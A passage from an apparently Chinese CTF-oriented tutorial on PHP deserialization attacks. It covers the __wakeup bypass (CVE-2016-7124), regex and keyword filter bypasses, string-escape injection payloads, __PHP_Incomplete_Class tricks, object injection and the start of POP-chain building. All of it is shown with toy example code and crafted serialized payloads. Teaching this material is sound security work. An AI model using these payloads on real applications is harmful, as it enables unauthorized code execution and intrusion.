class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="绕过__wakeupcve-2016-7124"><a class="markdownIt-Anchor" href="#绕过__wakeupcve-2016-7124">#</a> 绕过__wakeup (CVE-2016-7124)</h4><p>版本：</p><blockquote><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p></blockquote><p>利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup 的执行</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>如果执行 <code>unserialize('O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;');</code>  输出结果为 <code>666</code></p><p>而把对象属性个数的值增大执行 <code>unserialize('O:4:&quot;test&quot;:2&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;');</code>  输出结果为 abc</p><h4 id="绕过部分正则"><a class="markdownIt-Anchor" href="#绕过部分正则">#</a> 绕过部分正则</h4><p><code>preg_match('/^O:\d+/')</code>  匹配序列化字符串是否是对象字符串开头，这在曾经的 CTF 中也出过类似的考点</p><blockquote><p>・利用加号绕过（注意在 url 里传参时 + 要编码为 %2B）<br>・serialize (array (a) ) ; // a));//a));//a 为要反序列化的对象 (序列化结果开 头是 a，不影响作为数组元素的 $a 的析构)</p></blockquote><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="十六进制绕过字符匹配"><a class="markdownIt-Anchor" href="#十六进制绕过字符匹配">#</a> 十六进制绕过字符匹配</h4><p>可以使用十六进制搭配上已转义字符串来绕过对某些字符的检测</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name == <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You did it!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$str</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You can&#x27;t do it!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这里检测了是否包含  <code>flag</code>  字符，我们可以尝试使用  <code>flag</code>  的十六进制  <code>\66\6c\61\67</code>  来绕过，构造以下:</p><p><code>'O:4:&quot;Read&quot;:1:&#123;s:4:&quot;name&quot;;S:4:&quot;\66\6c\61\67&quot;;&#125;'</code></p><p>可以用下面 python 脚本将字符串转化为 Hex</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>(<span class="string">&#x27;Enter a string: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\\&#x27;</span> + <span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>(<span class="string">&#x27;\\&#x27;</span>))</span><br></pre></td></tr></table></figure></div><h4 id="利用引用"><a class="markdownIt-Anchor" href="#利用引用">#</a> 利用‘引用’</h4><p>对于需要判断两个变量是否相等时，我们可以考虑使用引用来让两个变量始终相等.</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b= &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;a===<span class="variable language_">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br></pre></td></tr></table></figure></div><p>上面这个例子将 <code>$b</code>  设置为 <code>$a</code>  的引用，可以使 <code>$a</code>  永远与 <code>$b</code>  相等</p><h4 id="php反序列化字符逃逸"><a class="markdownIt-Anchor" href="#php反序列化字符逃逸">#</a> php 反序列化字符逃逸</h4><h5 id="情况一过滤后字符过多"><a class="markdownIt-Anchor" href="#情况一过滤后字符过多">#</a> 情况一：过滤后字符过多</h5><p>例如以下情形：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;xx&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;I am 11&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=<span class="subst">$new</span>[1]&quot;</span>;</span><br></pre></td></tr></table></figure></div><p>正常情况，传入 <code>name=mao</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/394sFvRJkYWAglS.png" alt="image.png"></p><p>如果此时多传入一个 x 的话会怎样，毫无疑问反序列化失败，由于溢出 (s 本来是 4 结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/im4EPGFUnTDd52o.png" alt="image.png"></p><p>那我们传入 <code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/Amz5WT7IJGrwKL3.png" alt="image.png"></p><p>传入 <code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code> <br> <code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>  这一部分一共二十个字符<br>由于一个 x 会被替换为两个，我们输入了一共 20 个 x，现在是 40 个，多出来的 20 个 x 其实取代了我们的这二十个字符 <code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code> ，从而造成 <code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>  的溢出，而 &quot; 闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出 <code>woaini</code> <br> 最后的；} 闭合反序列化全过程导致原来的 <code>&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</code>  被舍弃，不影响反序列化过程</p><h5 id="情况二过滤后字符变少"><a class="markdownIt-Anchor" href="#情况二过滤后字符变少">#</a> 情况二：过滤后字符变少</h5><p>例如：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new</span>[<span class="string">&#x27;age&#x27;</span>];</span><br></pre></td></tr></table></figure></div><p>正常情况传入 <code>name=mao&amp;age=11</code>  的结果</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/S8lKoWxiAdyDfna.png" alt="image.png"></p><p>构造一下</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/wrXv7GNB41Amlug.png" alt="image.png"></p><p>简单来说，就是前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码；<br>我们来看，这部分是 age 序列化后的结果</p><p>s:3:“age”;s:28:“11”;s:3:“age”;s:6:“woaini”;}&quot;</p><p>由于前面是 40 个 x 所以导致少了 20 个字符，所以需要后面来补上， <code>&quot;;s:3:&quot;age&quot;;s:28:&quot;</code> 11 这一部分刚好 20 个，后面由于有&quot; 闭合了前面因此后面的参数就可以由我们自定义执行了</p><h4 id="利用不完整类绕过序列化回旋镖"><a class="markdownIt-Anchor" href="#利用不完整类绕过序列化回旋镖">#</a> 利用不完整类绕过序列化回旋镖</h4><p>当存在  <code>serialize(unserialize($x)) != $x</code>  这种很神奇的东西时，我们可以利用不完整类  <code>__PHP_Incomplete_Class</code>  来进行处理</p><p>当我们尝试反序列化到一个不存在的类是，PHP 会使用  <code>__PHP_Incomplete_Class_Name</code>  这个追加的字段来进行存储</p><p>我们于是可以尝试自己构造一个不完整类</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$raw</span> = <span class="string">&#x27;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:1:&quot;F&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$exp</span> = <span class="string">&#x27;O:1:&quot;F&quot;:1:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$raw</span>)) == <span class="variable">$exp</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></div><p>这样就可以绕过了</p><p>更近一步，我们可以通过这个让一个对象被调用后凭空消失，只需要手动构造无 <code>__PHP_Incomplete_Class_Name</code>  的不完整对象</p><h5 id="serialize-函数在处理__php_incomplete_class对象时所进行的特殊操作"><a class="markdownIt-Anchor" href="#serialize-函数在处理__php_incomplete_class对象时所进行的特殊操作">#</a> serialize () 函数在处理 <code>__PHP_Incomplete_Class</code>  对象时所进行的特殊操作</h5><p>unserialize () 在发现当前 PHP 上下文中没有包含相关类的类定义时将创建一个  <code>__PHP_Incomplete_Class</code>  对象。而 serialize () 在发现需要进行序列化的对象是  <code>__PHP_Incomplete_Class</code>  后，将对其进行 特殊处理 以得到描述实际对象而非  <code>__PHP_Incomplete_Class</code>  对象的序列化文本，而这里就包含了 将属性的描述值减一 这一步。<br>那么对象所属类的名称是否会发生替换，序列化文本中的  <code>__PHP_Incomplete_Class_Name</code>  是否会被自动删除以使得序列化文本中的属性个数描述值与实际相符呢？对此，请参考如下示例：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:22:&quot;__PHP_Incomplete_Class&quot;:3:&#123;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:7:&quot;MyClass&quot;;s:4:&quot;name&quot;;s:8:&quot;RedHeart&quot;;s:6:&quot;nation&quot;;s:5:&quot;China&quot;;&#125;&#x27;</span>)));</span><br></pre></td></tr></table></figure></div><p>执行结果</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">69</span>) <span class="string">&quot;O:7:&quot;</span>MyClass<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:8:&quot;</span>RedHeart<span class="string">&quot;;s:6:&quot;</span>nation<span class="string">&quot;;s:5:&quot;</span>China<span class="string">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure></div><p>结合前面观察到的种种现象，我们可以总结出 serialize () 函数对 __PHP_Incomplete_Class 对象执行了如下 特殊操作（操作描述顺序并非 serialize 函数的实际操作顺序）：</p><p>将 <code> __PHP_Incomplete_Class</code>  对象中的 属性个数减一 并将其作为序列化文本中 对实际对象属性个数的描述值。<br>将  <code>__PHP_Incomplete_Class</code>  对象的 <code> __PHP_Incomplete_Class_Name</code>  作为序列化文本中 对象所属类的描述值。若未从  <code>__PHP_Incomplete_Class </code> 对象 中检查到  <code>__PHP_Incomplete_Class_Name</code>  属性，则跳过此步。<br>将  <code>__PHP_Incomplete_Class </code> 对象的序列化文本中对  <code>__PHP_Incomplete_Class_Name </code> 属性的描述删去。若没有发现相关描述，则跳过此步。</p><p>关于 <code>__PHP_Incomplete_Class</code>  更详细的介绍 &lt;<a class="link" href="https://blog.csdn.net/qq_44879989/article/details/133486308">PHP 反序列化漏洞：__PHP_Incomplete_Class 与 serialize (unserialize ($x)) !== $x <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>&gt;</p><h4 id="对象注入"><a class="markdownIt-Anchor" href="#对象注入">#</a> 对象注入</h4><p>当用户的请求在传给反序列化函数 <code>unserialize()</code>  之前没有被正确的过滤时就会产生漏洞。因为 PHP 允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的 <code>unserialize</code>  函数，最终导致一个在该应用范围内的任意 PHP 对象注入。</p><p><strong>对象漏洞</strong>出现得满足两个前提</p><blockquote><p>1、 <code>unserialize</code>  的参数可控。<br>2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。</p></blockquote><p>比如：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;y4mao&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:5:&quot;maomi&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure></div><p>在脚本运行结束后便会调用 <code>_destruct</code>  函数，同时会覆盖 test 变量输出 <code>maomi</code></p><h3 id="pop"><a class="markdownIt-Anchor" href="#pop">#</a> POP</h3><h4 id="魔法函数"><a class="markdownIt-Anchor" href="#魔法函数">#</a> ———— 魔法函数 ———</h4><p>我需要再次提出魔法函数并且需要细致的解释供我更加深刻的理解</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__construct() //构造函数, 在对应对象实例化时自动被调用. #子类中的构造函数不会隐式调用父类的构造函数.在 PHP 8 以前, 与类名同名的方法可以作为 __constuct 调用但 __construct 方法优先</span><br><span class="line">__destruct() //对象被销毁时触发（对象不再被引用（unset），脚本执行结束）（当存在__destruct时，头一般是他）</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据（比如访问private属性或者不存在的属性的值时）或者不存在这个键（$this-&gt;str[&#x27;str&#x27;]-&gt;source）都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发（输出一个对象、属性，将对象或属性与字符串拼接，对对象或属性进行正则匹配）</span><br><span class="line">__invoke() //当尝试将对象（属性）调用为函数时触发</span><br><span class="line">__debugInfo() //在使用 var_dump, print_r 时会被调用</span><br><span class="line">__set_state()   // 调用var_export()导出类时，此静态方法会被调用</span><br><span class="line">__clone()       // 当对象复制完成时调用</span><br><span class="line">__autoload()    // 尝试加载未定义的类</span><br></pre></td></tr></table></figure></div><p>会发现，我在很多魔法函数的触发方式的解释中对象后面都加了（属性），这与 php 官方手册和其他博客文章的解释有些许不同，在查找资料时产生了很多疑惑，比如我翻阅的其中一篇博客：</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/10/4YHGV9zljdy67vL.png" alt="5fd161f2f08ca123a0c6ccd8f4cc17cd.png"></p><p>原文说此处触发了 <code>__toString</code>  函数，可明明只是将属性当作字符串，</p><p>再比如同一篇文章的另一处：</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/10/Ktx4MPXFmGnZ7cS.png" alt="28258fc1d508554e89f8f7d99d3855b1.png"></p><p>触发了 <code>__invoke</code>  函数</p><p>在与小伙伴讨论之后，认为可以将属性看作对象</p><p>在弄清楚各种魔法函数触发条件之后就要开始构建 pop 链了</p><h4 id="pop链"><a class="markdownIt-Anchor" href="#pop链">#</a> POP 链</h4><p>POP 链构造首先就是要找到头和尾，也就是用户能传入参数的地方（头）和最终要执行函数方法的地方（尾）。找到头尾之后进行反推过程，从尾部开始一步步找到能触发上一步的地方，直到找到传参处，此时完整的 POP 链就显而易见了。CTF 赛中一般尾部就是 get flag 的方法，头部则是 GET/POST 传参</p><p>举个例子：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span 